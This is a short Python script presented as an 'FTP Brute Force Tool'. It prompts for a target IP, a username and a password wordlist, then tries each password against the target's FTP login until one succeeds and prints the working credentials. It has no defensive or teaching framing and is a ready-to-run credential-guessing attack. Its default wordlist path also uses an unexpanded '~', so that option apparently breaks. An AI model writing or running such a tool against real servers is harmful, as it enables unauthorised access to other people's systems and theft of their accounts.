from ftplib import FTP
import os

def ftp_login(target_ip, username, password):
    try:
        ftp = FTP(target_ip, timeout=5)
        ftp.login(user=username, passwd=password)
        print(f"[✅] SUCCESS: {username}:{password}")
        ftp.quit()
        return True
    except:
        print(f"[❌] FAILED: {username}:{password}")
        return False

def main():
    print("📡 FTP Brute Force Tool")
    target_ip = input("Target IP: ").strip()
    username = input("FTP Username (default: anonymous): ").strip()
    if username == "":
        username = "anonymous"

    choice = input("Do you want a ready-made password list or your own? (y/n): ").strip().lower()

    if choice == 'y':
        wordlist = "~/Banana-cracker/passlist.txt"  # ya da Termux'ta nereye koyduysan
    else:
        wordlist = input("Type your password list path (example: /sdcard/pass.txt): ").strip()

    if not os.path.exists(wordlist):
        print("❌ Password list file not found!")
        return

    print(f"🔍 Starting brute force on {target_ip} with username: {username}")
    with open(wordlist, 'r', errors='ignore') as f:
        for line in f:
            password = line.strip()
            if ftp_login(target_ip, username, password):
                print("🎉 Password found!")
                break

if __name__ == "__main__":
    main()
